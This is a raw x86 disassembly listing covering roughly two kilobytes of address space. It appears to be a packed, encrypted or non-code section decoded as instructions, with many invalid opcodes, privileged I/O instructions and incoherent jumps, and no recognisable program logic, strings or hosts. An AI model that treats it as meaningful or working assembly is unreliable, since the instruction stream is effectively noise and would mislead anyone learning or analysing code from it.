  4111f9:	ins    BYTE PTR es:[edi],dx
  4111fa:	imul   DWORD PTR [edi-0x42110f1c]
  411200:	fs or  eax,0x548ded31
  411206:	cdq    
  411207:	sub    al,0x55
  411209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41120a:	push   0xffffff96
  41120c:	cmp    eax,0x8b664238
  411211:	fiadd  WORD PTR [edx+0x25]
  411214:	pop    ebx
  411215:	js     0x411207
  411217:	loopne 0x41127c
  411219:	test   BYTE PTR [edi+0x5878fe78],al
  41121f:	dec    ebx
  411220:	rcr    eax,0xaa
  411223:	imul   ecx,DWORD PTR [esi-0x7b04a3f],0x360039b0
  41122d:	ds mov cl,bl
  411230:	mov    ecx,0x527cffde
  411235:	mov    fs,ebp
  411237:	mov    ebp,0xa76e35b4
  41123c:	js     0x4111c9
  41123e:	xchg   esi,eax
  41123f:	jle    0x4111da
  411241:	push   ds
  411242:	addr16 dec ecx
  411244:	add    esp,DWORD PTR [eax]
  411246:	(bad)  
  411247:	rcl    DWORD PTR [edi],1
  411249:	ss adc eax,0x2f71c001
  41124f:	repnz test al,0xb1
  411252:	mov    ebp,DWORD PTR [ebx-0x66]
  411255:	inc    ecx
  411256:	xor    al,0xb5
  411258:	mov    BYTE PTR [edx+0x58],bh
  41125b:	ds fwait
  41125d:	jno    0x4112a5
  41125f:	ins    DWORD PTR es:[edi],dx
  411260:	mov    bl,0xb1
  411262:	sub    ecx,DWORD PTR [ecx+ebx*2+0x1fcd0864]
  411269:	add    eax,0x84b40a13
  41126e:	jb     0x4112bc
  411270:	push   0xffffff95
  411272:	inc    eax
  411273:	pop    eax
  411274:	sub    al,0xf7
  411276:	xchg   DWORD PTR [ecx],ebx
  411278:	and    edi,edx
  41127a:	test   ch,al
  41127c:	inc    ecx
  41127d:	or     edi,DWORD PTR [ecx]
  41127f:	dec    eax
  411280:	xlat   BYTE PTR ds:[ebx]
  411281:	fadd   st,st(3)
  411283:	or     cl,ch
  411285:	iret   
  411286:	xor    eax,0x22b73aea
  41128b:	sub    ecx,esi
  41128d:	sub    eax,0x5ac06e63
  411292:	push   esi
  411293:	jge    0x41124d
  411295:	inc    edi
  411296:	adc    dl,BYTE PTR [ecx+0x2b]
  411299:	rcl    esi,0xd2
  41129c:	pop    esp
  41129d:	jecxz  0x411289
  41129f:	aaa    
  4112a0:	ud2    
  4112a2:	xchg   ecx,eax
  4112a3:	popf   
  4112a4:	cmp    DWORD PTR [eax+edx*8],eax
  4112a7:	ret    
  4112a8:	ins    BYTE PTR es:[edi],dx
  4112a9:	jno    0x41125a
  4112ab:	mov    bl,BYTE PTR ss:[edi]
  4112ae:	adc    edi,DWORD PTR [ebx]
  4112b0:	adc    DWORD PTR [ebx+0x10],0x68adc276
  4112b7:	mov    al,BYTE PTR [edx+0x56a8e8e6]
  4112bd:	sub    al,0x89
  4112bf:	test   BYTE PTR [edx-0x70],0x62
  4112c3:	lock inc edx
  4112c5:	sub    eax,0x1dbacbda
  4112ca:	push   ebx
  4112cb:	mov    edi,0x7ae2825d
  4112d0:	mov    dh,ah
  4112d2:	adc    DWORD PTR es:[esi-0x73],edx
  4112d6:	cmp    cl,bh
  4112d8:	xlat   BYTE PTR ds:[ebx]
  4112d9:	sbb    eax,0x7ef996a7
  4112de:	add    cl,BYTE PTR [edx+ecx*1-0x7b08f14a]
  4112e5:	xchg   ebx,eax
  4112e6:	push   cs
  4112e7:	mov    ds:0x4724c2c0,eax
  4112ec:	repnz pop ss
  4112ee:	or     al,0x97
  4112f0:	adc    dh,BYTE PTR [esi]
  4112f2:	ficomp WORD PTR [eax-0x1a2f7d4d]
  4112f8:	jmp    0x6c06961e
  4112fd:	aaa    
  4112fe:	mov    bh,0x53
  411300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411301:	jns    0x41136e
  411303:	or     ebx,DWORD PTR [ebx+0x18]
  411306:	mov    ds:0x416632b8,eax
  41130b:	mov    ah,0x84
  41130d:	xchg   DWORD PTR [ecx],ecx
  41130f:	inc    eax
  411310:	mov    al,0x78
  411312:	retf   0xd57d
  411315:	sar    BYTE PTR [ecx],0xa7
  411318:	or     al,0xca
  41131a:	mov    ebx,0x7484f6be
  41131f:	pop    eax
  411320:	(bad)  
  411321:	stos   BYTE PTR es:[edi],al
  411322:	sub    BYTE PTR [ebp+0x33117bd5],bl
  411328:	pand   mm0,QWORD PTR [esi+0x2fbf888d]
  41132f:	push   0xebcb5a4b
  411334:	jne    0x411375
  411336:	add    DWORD PTR [edx],ecx
  411338:	pop    es
  411339:	dec    ebx
  41133a:	sub    ebp,DWORD PTR [esi-0x6a]
  41133d:	sub    dl,cl
  41133f:	sbb    dh,BYTE PTR [edi-0x7a1af77b]
  411345:	shl    bh,cl
  411347:	lds    ebp,FWORD PTR [ebp-0x1f]
  41134a:	add    cl,ch
  41134c:	shr    BYTE PTR [eax+edx*4],1
  41134f:	mov    BYTE PTR [edx],bl
  411351:	and    BYTE PTR [ecx-0x54],cl
  411354:	fs mov al,0xa7
  411357:	test   al,0x6f
  411359:	stc    
  41135a:	inc    ecx
  41135b:	in     al,dx
  41135c:	cmc    
  41135d:	ret    
  41135e:	fldcw  WORD PTR [ebp-0x1b11eb47]
  411364:	fisttp DWORD PTR [ebp-0x48c56cdb]
  41136a:	push   eax
  41136b:	or     al,0x74
  41136d:	addr16 out 0x90,eax
  411370:	fdiv   QWORD PTR [esi+0x59843922]
  411376:	(bad)  
  411377:	or     al,0xbe
  411379:	fld    QWORD PTR [eax+0x34]
  41137c:	lods   al,BYTE PTR ds:[esi]
  41137d:	inc    ebx
  41137e:	cli    
  41137f:	ficom  WORD PTR [eax]
  411381:	fst    st(5)
  411383:	(bad)  
  411384:	daa    
  411385:	xchg   esp,eax
  411386:	mov    esi,0x7032b20d
  41138b:	ret    0xdbcc
  41138e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41138f:	shl    BYTE PTR [ebx-0x80],1
  411392:	ret    0x96b6
  411395:	pop    ebx
  411396:	dec    ecx
  411397:	mov    esi,0x30586090
  41139c:	call   0xcb5bac23
  4113a1:	stos   BYTE PTR es:[edi],al
  4113a2:	mov    dl,0xf6
  4113a4:	outs   dx,BYTE PTR ds:[esi]
  4113a5:	and    ebp,DWORD PTR ds:0xc9a2c3af
  4113ab:	pusha  
  4113ac:	cmp    DWORD PTR [edi],ebx
  4113ae:	mov    gs,WORD PTR [esi-0x10]
  4113b1:	stc    
  4113b2:	inc    edx
  4113b3:	or     BYTE PTR [eax-0x7e],bl
  4113b6:	sbb    eax,0xd78de949
  4113bb:	repnz mov al,0xb8
  4113be:	pop    ss
  4113bf:	sahf   
  4113c0:	rcl    DWORD PTR [edx],1
  4113c2:	in     al,0x28
  4113c4:	addr16 test al,0x8b
  4113c7:	inc    esp
  4113c8:	repnz fldenv [ebp-0x27b86cc8]
  4113cf:	sub    DWORD PTR [eax-0x32],esp
  4113d2:	fiadd  DWORD PTR [esi]
  4113d4:	dec    esi
  4113d5:	xor    DWORD PTR fs:[eax],eax
  4113d8:	and    DWORD PTR [ebx],ebx
  4113da:	mov    al,fs:0xf3b1addb
  4113e0:	cmp    dh,0xfb
  4113e3:	(bad)  
  4113e5:	mov    cl,0x4e
  4113e7:	call   0x4e48:0xb175b151
  4113ee:	pusha  
  4113ef:	jmp    0x41138b
  4113f1:	inc    edi
  4113f2:	in     al,dx
  4113f3:	stc    
  4113f4:	push   edi
  4113f5:	jle    0x4113e0
  4113f7:	pop    ecx
  4113f8:	ja     0x4113bb
  4113fa:	cwde   
  4113fb:	inc    ecx
  4113fc:	(bad)  
  4113fd:	lock dec edi
  4113ff:	xor    al,0x40
  411401:	cmp    edx,esi
  411403:	addr16 and cl,cl
  411406:	sbb    al,0x32
  411408:	xchg   BYTE PTR [eax+edx*4],dh
  41140b:	push   ebp
  41140c:	lods   eax,DWORD PTR ds:[esi]
  41140d:	shr    BYTE PTR [ecx-0x396e8132],cl
  411413:	jo     0x411402
  411415:	sub    DWORD PTR [ecx+0x66],0x57954053
  41141c:	pop    ebp
  41141d:	cmc    
  41141e:	aas    
  41141f:	iret   
  411420:	pavgb  mm0,QWORD PTR [esi]
  411423:	or     al,0x8
  411425:	adc    DWORD PTR [eax+0x3acd6606],ecx
  41142b:	xor    eax,0x7019d5eb
  411430:	mov    DWORD PTR [edi+0x3bb6d74d],ebp
  411436:	test   eax,0x9117b9b3
  41143b:	mov    ds:0x31a7a218,al
  411440:	lock push edi
  411442:	cmc    
  411443:	ja     0x4114a7
  411445:	sub    al,dh
  411447:	add    DWORD PTR [esi+0x4f786338],0x688914f1
  411451:	fdivrp st(0),st
  411453:	not    BYTE PTR [edx+0x12326d7f]
  411459:	mov    ah,cl
  41145b:	lds    ecx,FWORD PTR [esi-0x1fdb8cfb]
  411461:	xchg   edi,eax
  411462:	xor    eax,0x5423c721
  411467:	xchg   esi,eax
  411468:	jns    0x4114cf
  41146a:	sbb    dl,BYTE PTR [edi+0x240cf591]
  411470:	mov    cl,0xc1
  411472:	pop    eax
  411473:	(bad)  [edx+eiz*1+0x3d]
  411477:	nop
  411478:	(bad)  
  411479:	repnz nop
  41147b:	mov    eax,0x7ac839d5
  411480:	outs   dx,BYTE PTR ds:[esi]
  411481:	add    edx,edi
  411483:	sbb    bh,BYTE PTR [edx]
  411485:	push   eax
  411486:	xor    esi,esi
  411488:	sbb    DWORD PTR [edx*2-0x571af156],0x35
  411490:	cld    
  411491:	(bad)  
  411492:	ja     0x4114cb
  411494:	dec    edi
  411495:	and    dl,BYTE PTR [edi-0x18]
  411498:	out    0x91,eax
  41149a:	xchg   edi,eax
  41149b:	test   eax,0x3af1f0ed
  4114a0:	fst    QWORD PTR [edi]
  4114a2:	int3   
  4114a3:	push   es
  4114a4:	fs inc eax
  4114a6:	ja     0x4114ee
  4114a8:	ficomp WORD PTR [ecx]
  4114aa:	jmp    0x4114f6
  4114ac:	mov    dh,0x43
  4114ae:	xchg   ecx,eax
  4114af:	cdq    
  4114b0:	dec    ebx
  4114b1:	xchg   edx,eax
  4114b2:	mov    al,ds:0x62938428
  4114b7:	sub    BYTE PTR [ebx+esi*8-0x7fd78d04],dl
  4114be:	int3   
  4114bf:	or     DWORD PTR ds:0x5dee9019,ebx
  4114c5:	push   edx
  4114c6:	push   cs
  4114c7:	(bad)  
  4114c8:	jge    0x411455
  4114ca:	loope  0x4114e0
  4114cc:	xlat   BYTE PTR ds:[ebx]
  4114cd:	das    
  4114ce:	add    BYTE PTR [edi+0x33ab2adb],al
  4114d4:	or     DWORD PTR [ecx-0x6d],0xc4cfb7d1
  4114db:	sahf   
  4114dc:	or     al,0x49
  4114de:	ss jmp 0xca80289d
  4114e4:	dec    ebx
  4114e5:	test   DWORD PTR [ebx+eiz*8],edi
  4114e8:	pop    ecx
  4114e9:	das    
  4114ea:	push   es
  4114eb:	jmp    0xd436b781
  4114f0:	imul   edi,DWORD PTR [ebp+0x14661fb0],0x377fcaef
  4114fa:	or     dh,cl
  4114fc:	push   ds
  4114fd:	leave  
  4114fe:	(bad)  
  411500:	mov    cl,0xb4
  411502:	adc    eax,0x88910088
  411507:	fsub   QWORD PTR [ebx+0x3a0b820b]
  41150d:	in     al,dx
  41150e:	sub    eax,0x77c44206
  411513:	dec    esi
  411514:	sub    eax,0x9f3cc4b
  411519:	jge    0x4114d2
  41151b:	jl     0x41158f
  41151d:	cs loop 0x411551
  411520:	shl    DWORD PTR [ebx-0x28f9baf8],cl
  411526:	enter  0xd505,0xc4
  41152a:	or     edi,DWORD PTR [eax]
  41152c:	test   eax,0xbd917d3
  411531:	lds    esp,FWORD PTR [esi-0x68]
  411534:	or     dh,dl
  411536:	ficom  DWORD PTR [edi+0x9]
  411539:	sbb    ebp,DWORD PTR [edx+0x7c8d0c82]
  41153f:	jmp    0x4dcc:0xabb3ac45
  411546:	aad    0x65
  411548:	push   esi
  411549:	ret    0x78fa
  41154c:	stos   DWORD PTR es:[edi],eax
  41154d:	sub    ebx,edi
  41154f:	mov    ch,BYTE PTR [eax-0x4b]
  411552:	jbe    0x4114e3
  411554:	push   es
  411555:	gs scas al,BYTE PTR es:[edi]
  411557:	mov    edi,0xbb927f66
  41155c:	inc    esi
  41155d:	push   0xe8871931
  411562:	in     eax,0x94
  411564:	inc    ecx
  411565:	cmp    cl,bh
  411567:	xchg   edx,eax
  411568:	jno    0x4115d7
  41156a:	pop    ds
  41156b:	sub    cl,al
  41156d:	ins    BYTE PTR es:[edi],dx
  41156e:	inc    edi
  41156f:	test   DWORD PTR [edx],ecx
  411571:	je     0x411504
  411573:	mov    BYTE PTR [edi],bh
  411575:	test   BYTE PTR [edi+0x2e33cd1a],cl
  41157b:	in     eax,dx
  41157c:	adc    DWORD PTR [ecx-0x4353f9f9],esp
  411582:	jg     0x4115fc
  411584:	stos   BYTE PTR es:[edi],al
  411585:	push   ss
  411586:	pusha  
  411587:	hlt    
  411588:	test   bh,ch
  41158a:	lock ins BYTE PTR es:[edi],dx
  41158c:	cmp    dl,BYTE PTR [ecx]
  41158e:	call   0xf6f8d2ca
  411593:	push   0xffffffc9
  411595:	mov    ds:0xe099d40e,al
  41159a:	test   eax,0xbf75556e
  41159f:	mov    dh,0x19
  4115a1:	les    ebp,FWORD PTR [esi-0x11]
  4115a4:	mov    edi,0x1674503f
  4115a9:	jae    0x411588
  4115ab:	cmc    
  4115ac:	dec    ebp
  4115ad:	mov    dl,0xc0
  4115af:	cmp    BYTE PTR [esi+0x29],0xe9
  4115b3:	jno    0x411608
  4115b5:	dec    esp
  4115b6:	jbe    0x4115ed
  4115b8:	js     0x411555
  4115ba:	pop    ss
  4115bb:	cmp    eax,0x12ca8bfa
  4115c0:	data16 in al,0xb
  4115c3:	adc    al,0xf8
  4115c5:	icebp  
  4115c6:	lods   eax,DWORD PTR ds:[esi]
  4115c7:	dec    ecx
  4115c8:	lds    ebp,FWORD PTR ds:0xdfd83c97
  4115ce:	pop    edi
  4115cf:	and    eax,0xd1346cb6
  4115d4:	aam    0x68
  4115d6:	cmp    ebp,esp
  4115d8:	fild   QWORD PTR [edi+0x18]
  4115db:	addr16 inc edx
  4115dd:	push   eax
  4115de:	xchg   BYTE PTR [ecx+0x69],bh
  4115e1:	imul   ebx,esi,0xbac1560d
  4115e7:	adc    edi,ebp
  4115e9:	pop    ecx
  4115ea:	lahf   
  4115eb:	sbb    ebx,eax
  4115ed:	push   edi
  4115ee:	mov    edx,0x366e89c1
  4115f3:	ins    DWORD PTR es:[edi],dx
  4115f4:	adc    al,0x3e
  4115f6:	cmp    dl,dh
  4115f8:	pop    edi
  4115f9:	call   0x2315e0de
  4115fe:	leave  
  4115ff:	dec    edx
  411600:	fidiv  DWORD PTR [eax+edx*4]
  411603:	sar    DWORD PTR [edx],cl
  411605:	das    
  411606:	cld    
  411607:	xor    ecx,esi
  411609:	int    0x15
  41160b:	cs push edx
  41160d:	sub    edx,edi
  41160f:	imul   ecx,DWORD PTR [edx],0xf7554624
  411615:	fs sahf 
  411617:	mov    ah,0x46
  411619:	std    
  41161a:	mov    dh,0x41
  41161c:	jne    0x4115e9
  41161e:	aam    0xaa
  411620:	xchg   DWORD PTR [edx],ebx
  411622:	xor    eax,0xd33fd013
  411627:	jmp    0x26b0ba45
  41162c:	mov    al,ds:0x61794fde
  411631:	mov    al,ds:0x8eff8b7a
  411636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411637:	jg     0x411656
  411639:	push   0x9b7c6d76
  41163e:	pop    esi
  41163f:	nop
  411640:	push   edi
  411641:	jecxz  0x4115de
  411643:	mov    ds:0xb573ce75,eax
  411648:	dec    ebp
  411649:	jge    0x41161e
  41164b:	add    bl,BYTE PTR [edx]
  41164d:	push   esi
  41164e:	shl    BYTE PTR [ebx-0x24],0x72
  411652:	mov    WORD PTR [ecx+0x4945cb11],ss
  411658:	jmp    0xe32f:0xa055282d
  41165f:	idiv   DWORD PTR [ebp+ebx*4+0x4a]
  411663:	xchg   ecx,eax
  411664:	out    dx,eax
  411665:	xchg   BYTE PTR [edi+0x67],ah
  411668:	add    dh,BYTE PTR [ecx]
  41166a:	mov    ebx,0x45c35225
  41166f:	rep movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  411672:	jne    0x41169a
  411674:	push   fs
  411676:	sub    DWORD PTR [ebx],0xa
  411679:	pop    edx
  41167a:	mov    al,ds:0xde315f8a
  41167f:	call   0x99ee:0xfd70937c
  411686:	fild   QWORD PTR [eax+eiz*1]
  411689:	sbb    al,0x15
  41168b:	sub    bl,BYTE PTR [edi]
  41168d:	pop    ebx
  41168e:	sbb    bh,bh
  411690:	aas    
  411691:	ins    DWORD PTR es:[edi],dx
  411692:	cdq    
  411693:	sbb    esi,esp
  411695:	aas    
  411696:	mov    eax,ds:0xe6994d94
  41169b:	ins    BYTE PTR es:[edi],dx
  41169c:	stos   DWORD PTR es:[edi],eax
  41169d:	lock push edi
  41169f:	pop    eax
  4116a0:	fsubrp st(3),st
  4116a2:	cmp    DWORD PTR [eax+0x340fa5e7],0xffffff8f
  4116a9:	sbb    al,0x27
  4116ab:	loop   0x4116ca
  4116ad:	fsub   st,st(2)
  4116af:	jmp    0x4962:0x702a64b1
  4116b6:	jns    0x4116b9
  4116b8:	enter  0x5425,0x81
  4116bc:	pop    ebp
  4116bd:	sahf   
  4116be:	cmp    eax,0x7367c9aa
  4116c3:	call   0xab10a6c6
  4116c8:	mov    bh,0xa6
  4116ca:	int    0x5a
  4116cc:	lsl    ebp,WORD PTR [ecx+0x7]
  4116d0:	mov    dl,0x3e
  4116d2:	pop    esi
  4116d3:	lahf   
  4116d4:	out    dx,al
  4116d5:	mov    ecx,DWORD PTR [ebx+0x3]
  4116d8:	in     al,dx
  4116d9:	cdq    
  4116da:	mov    eax,ds:0x65f3554c
  4116df:	push   esp
  4116e0:	and    BYTE PTR [eax],bl
  4116e2:	nop
  4116e3:	jno    0x4116cf
  4116e5:	stos   DWORD PTR es:[edi],eax
  4116e6:	mov    bh,0x86
  4116e9:	shl    DWORD PTR [ecx+0x1ad7caa8],1
  4116ef:	retf   0xab20
  4116f2:	mov    al,0x79
  4116f4:	in     eax,0x77
  4116f6:	jnp    0x41170a
  4116f8:	out    0xd9,al
  4116fa:	xchg   DWORD PTR [esi-0x41686fc4],esp
  411700:	inc    edi
  411701:	dec    ebp
  411702:	xchg   DWORD PTR [edi+0x77],esi
  411705:	mov    cl,0x95
  411707:	(bad)  
  411709:	pop    esi
  41170a:	cmp    DWORD PTR [ecx+ecx*8],ebx
  41170d:	in     al,dx
  41170e:	mov    ebp,0xed598a2e
  411713:	sbb    eax,0x672e519f
  411718:	retf   0x9a50
  41171b:	xchg   edx,eax
  41171c:	push   ss
  41171d:	cmp    eax,0x33fcece0
  411722:	cmp    eax,0x2e9183c9
  411727:	out    dx,al
  411728:	sub    BYTE PTR [esi+0x65c398e4],dl
  41172e:	jno    0x4116c4
  411730:	imul   esp,DWORD PTR [ecx+eiz*8-0x4f],0xffffff9a
  411735:	inc    esi
  411736:	push   ebx
  411737:	xchg   BYTE PTR [ebp+0x73],bh
  41173a:	dec    ecx
  41173b:	xlat   BYTE PTR ds:[ebx]
  41173c:	ins    BYTE PTR es:[edi],dx
  41173d:	and    ch,bl
  41173f:	std    
  411740:	cdq    
  411741:	dec    ecx
  411742:	pop    eax
  411743:	loopne 0x41173f
  411745:	test   BYTE PTR [edi+0xc17afef],cl
  41174b:	loopne 0x411700
  41174d:	xchg   ebp,eax
  41174e:	xor    bl,BYTE PTR [edx+0x4d]
  411751:	mov    ds:0x53aa66b0,eax
  411756:	aas    
  411757:	or     edi,DWORD PTR [esi+0x79]
  41175a:	push   es
  41175b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41175c:	sete   cl
  41175f:	lea    esi,fs:[edx-0x794dd3ac]
  411766:	or     al,0xee
  411768:	xor    eax,0xffffffd5
  41176b:	jo     0x411712
  41176d:	sar    BYTE PTR [esi],0x46
  411770:	or     ah,BYTE PTR [eax+0x37]
  411773:	sub    DWORD PTR [edi-0x14],0xffffff9f
  411777:	adc    BYTE PTR [ebx+edx*8],bh
  41177a:	ret    0x9d6d
  41177d:	test   BYTE PTR [esi],bh
  41177f:	inc    esp
  411780:	add    BYTE PTR cs:[edi-0x4a],0xd7
  411785:	(bad)  
  411786:	jbe    0x411709
  411788:	sub    DWORD PTR [esi],ebp
  41178a:	int    0x92
  41178c:	outs   dx,BYTE PTR ds:[esi]
  41178d:	fcomp  QWORD PTR es:[eax]
  411790:	mov    WORD PTR [esi-0x3c88868b],gs
  411796:	pop    ebp
  411797:	sub    al,al
  411799:	daa    
  41179a:	and    dl,BYTE PTR [ebx]
  41179c:	bound  ebx,QWORD PTR [ebp-0x22ad55ac]
  4117a2:	jg     0x4117ea
  4117a4:	out    0xb5,al
  4117a6:	push   esp
  4117a7:	test   DWORD PTR [ebp-0x1f],ebp
  4117aa:	idiv   BYTE PTR [ebx+0x79bc69f7]
  4117b0:	xchg   ebp,eax
  4117b1:	jno    0x411745
  4117b3:	adc    eax,0xdcacd993
  4117b8:	adc    DWORD PTR [esi],esp
  4117ba:	and    esp,DWORD PTR [edx+eax*8-0x1e65ce5c]
  4117c1:	loope  0x4117ef
  4117c3:	dec    esp
  4117c4:	xor    bh,BYTE PTR [eax]
  4117c6:	(bad)  
  4117c7:	pop    es
  4117c8:	cmp    al,cl
  4117ca:	mov    ds:0x804ce63f,al
  4117cf:	adc    ebp,DWORD PTR [ebp-0x15]
  4117d2:	push   es
  4117d3:	jmp    0x4117fa
  4117d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117d6:	sub    eax,0x73cd88bb
  4117db:	mov    al,0x17
  4117dd:	mov    edx,0xe745f06a
  4117e3:	jno    0x41184e
  4117e5:	add    DWORD PTR [esi-0x67],esi
  4117e8:	mov    bh,0xb0
  4117ea:	sti    
  4117eb:	inc    eax
  4117ec:	sbb    BYTE PTR ss:[ebx-0x100ffc24],bl
  4117f3:	ja     0x411852
  4117f5:	xchg   edi,eax
  4117f6:	repz aaa 
  4117f8:	dec    ebx
  4117f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117fa:	mov    ds:0xe42cf2ae,eax
  4117ff:	push   ss
  411800:	popa   
  411801:	fld    TBYTE PTR [edx]
  411803:	xor    BYTE PTR [edx+edi*8],bl
  411806:	fsub   QWORD PTR ss:[ebx+eiz*1-0x596825b]
  41180e:	add    bl,ah
  411810:	outs   dx,DWORD PTR ds:[esi]
  411811:	jmp    0xe3fb0c46
  411816:	add    bh,bl
  411818:	mov    esp,0x332b8198
  41181d:	rol    DWORD PTR [edi+0x4d],1
  411820:	gs jae 0x4117ca
  411823:	leave  
  411824:	gs loop 0x411879
  411827:	scas   eax,DWORD PTR es:[edi]
  411828:	push   ds
  411829:	jecxz  0x41184f
  41182b:	push   esi
  41182c:	or     BYTE PTR [ecx+0x4223a01e],0xc0
  411833:	mov    al,0x80
  411835:	mov    bh,0xeb
  411837:	push   edi
  411838:	aad    0xa8
  41183a:	add    bl,BYTE PTR [eax*4-0x35f557dc]
  411841:	jnp    0x41185a
  411843:	mov    bh,0x9e
  411845:	sub    eax,0xc266a500
  41184a:	pop    ds
  41184b:	jnp    0x41181f
  41184d:	xor    ebp,DWORD PTR [ebx+0xda1ff27]
  411853:	dec    DWORD PTR [ecx+0x60]
  411856:	jns    0x4118b4
  411858:	stos   BYTE PTR es:[edi],al
  411859:	das    
  41185a:	rcr    BYTE PTR [edx+0x7251fbfe],1
  411860:	lea    esp,[ebp+0x1]
  411863:	add    al,BYTE PTR [edx+0x63f0979d]
  411869:	mov    ds:0x9ec22a38,eax
  41186e:	int3   
  41186f:	cwde   
  411870:	sahf   
  411871:	repnz xchg edx,eax
  411873:	ja     0x4118e3
  411875:	gs jb  0x4118e1
  411878:	pop    esp
  411879:	outs   dx,BYTE PTR ds:[esi]
  41187a:	or     eax,0x964a4e35
  41187f:	jg     0x41186d
  411881:	sahf   
  411882:	pop    es
  411883:	mov    WORD PTR [edx-0x30],?
  411886:	add    BYTE PTR [edx],dl
  411888:	rol    BYTE PTR ds:0x1f872954,0x34
  41188f:	push   ss
  411890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411891:	sbb    BYTE PTR [ebp+0x5dca651d],bl
  411897:	jge    0x4118ea
  411899:	scas   al,BYTE PTR es:[edi]
  41189a:	xor    BYTE PTR [edi],ah
  41189c:	addr16 push esi
  41189e:	je     0x4118b8
  4118a0:	adc    BYTE PTR [ecx-0x4c0a5ba2],0xa6
  4118a7:	and    ah,BYTE PTR [edx-0x62cd137f]
  4118ad:	(bad)  
  4118ae:	out    dx,eax
  4118af:	fs int 0x6f
  4118b2:	mov    ds:0xb0613285,al
  4118b7:	sub    edi,DWORD PTR [ebx-0x9]
  4118ba:	jg     0x411857
  4118bc:	mov    bl,BYTE PTR [ebx-0x14752616]
  4118c2:	jp     0x4118e3
  4118c4:	cwde   
  4118c5:	in     eax,0xc5
  4118c7:	cmp    ebx,ebx
  4118c9:	fsub   st,st(6)
  4118cb:	xchg   edi,eax
  4118cc:	push   ecx
  4118cd:	scas   al,BYTE PTR es:[edi]
  4118ce:	imul   ecx,eax,0x662c80ba
  4118d4:	or     eax,0xff0b846c
  4118d9:	cdq    
  4118da:	cwde   
  4118db:	jmp    0x4118d3
  4118dd:	outs   dx,BYTE PTR ds:[esi]
  4118de:	fnstcw WORD PTR [edx-0x3d6ad6ac]
  4118e4:	push   ecx
  4118e5:	push   0x70
  4118e7:	loopne 0x4118c6
  4118e9:	sbb    BYTE PTR [ebx],al
  4118eb:	lock push ss
  4118ed:	(bad)  
  4118ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f0:	pushf  
  4118f1:	aam    0xaf
  4118f3:	je     0x411951
  4118f5:	mov    BYTE PTR [eax],ch
  4118f7:	popa   
  4118f8:	shl    BYTE PTR [ebx-0x64],1
  4118fb:	jo     0x4118b6
  4118fd:	jns    0x41193e
  4118ff:	adc    eax,0xb6add7a3
  411904:	into   
  411905:	adc    dl,BYTE PTR [esi+0x7c03dae6]
  41190b:	mov    al,ds:0x3f5c7cf4
  411910:	add    BYTE PTR [edi+0x668e4d1b],dl
  411916:	mov    BYTE PTR [ebx-0x34abd2d3],al
  41191c:	stos   BYTE PTR es:[edi],al
  41191d:	mov    DWORD PTR [eax-0x13f7c6f6],edx
  411923:	or     BYTE PTR [ecx+0x70],ah
  411926:	sub    eax,0x6ee02e58
  41192b:	push   ss
  41192c:	(bad)  
  41192d:	inc    eax
  41192e:	xchg   ecx,eax
  41192f:	push   ebp
  411930:	scas   al,BYTE PTR es:[edi]
  411931:	adc    DWORD PTR [eax-0x14],ecx
  411934:	sub    ebp,DWORD PTR [edx+0x2a]
  411937:	daa    
  411938:	popf   
  411939:	and    eax,0xb1b618f
  41193e:	inc    ecx
  41193f:	dec    esp
  411940:	jmp    0x4119af
  411942:	mov    ds:0xb9ecbbc5,eax
  411947:	ficom  WORD PTR cs:[edx+0xfdc2108]
  41194e:	and    edx,DWORD PTR [esi-0x4c558b81]
  411954:	jns    0x41194e
  411956:	rcr    DWORD PTR [eax+0x7a95d07b],0xe8
  41195d:	(bad)  
  41195e:	das    
  41195f:	icebp  
  411960:	cmp    eax,0xd0fa9f2d
  411965:	ds sub al,0xfc
  411968:	xchg   ebp,eax
  411969:	into   
  41196a:	push   eax
  41196b:	jmp    0x41198a
  41196d:	pushf  
  41196e:	push   edx
  41196f:	jne    0x411911
  411971:	adc    edi,DWORD PTR [ecx+0x281792da]
  411977:	rol    BYTE PTR [eax+eax*2-0x56],0x86
  41197c:	sbb    al,0xe3
  41197e:	dec    eax
  41197f:	fist   WORD PTR [edi+0x24]
  411982:	(bad)  
  411983:	sti    
  411984:	inc    ebp
  411985:	pop    ss
  411986:	aad    0x55
  411988:	push   ss
  411989:	mov    bl,0x95
  41198b:	inc    edi
  41198c:	or     al,BYTE PTR [ebx]
  41198e:	call   0x8fcb344a
  411993:	mov    ah,0x83
  411995:	pop    es
  411996:	mov    cl,0x8a
  411998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411999:	daa    
  41199a:	add    DWORD PTR [bx+di],esp
  41199d:	xor    al,0x8f
  41199f:	daa    
  4119a0:	out    0x12,al
  4119a2:	dec    edx
  4119a3:	sbb    ch,BYTE PTR cs:[ebp+0x50]
  4119a7:	call   0xe86a:0xff8b0521
  4119ae:	push   es
  4119af:	int3   
  4119b0:	and    DWORD PTR [edx],ebx
  4119b2:	data16 ds ror cl,0x2e
  4119b7:	xchg   edi,eax
  4119b8:	adc    BYTE PTR [esi-0x7d11e083],0x7a
  4119bf:	in     eax,0x52
  4119c1:	pop    ecx
  4119c2:	or     esi,eax
  4119c4:	fld    TBYTE PTR [ebx+edx*8+0x246ba228]
  4119cb:	xor    edx,esp
  4119cd:	xchg   DWORD PTR [eax],edx
  4119cf:	push   ebx
  4119d0:	jne    0x4119b9
  4119d2:	push   ecx
  4119d3:	dec    esi
  4119d4:	or     DWORD PTR [ecx],ebp
  4119d6:	push   eax
  4119d7:	adc    esi,edi
  4119d9:	retf   
  4119da:	cmp    dh,BYTE PTR [ecx-0x2415a78d]
  4119e0:	retf   
  4119e1:	lahf   
  4119e2:	mov    ds:0xf564b1dd,eax
  4119e7:	cmp    BYTE PTR [ebx+eax*2],bl
  4119ea:	add    DWORD PTR [esi+0x6bf74bfc],ebp
  4119f0:	mov    cl,0xf5
  4119f2:	xor    DWORD PTR [edx+0x67931f5c],esp
  4119f8:	cmp    DWORD PTR [esp+ebp*8-0x238b60de],esp
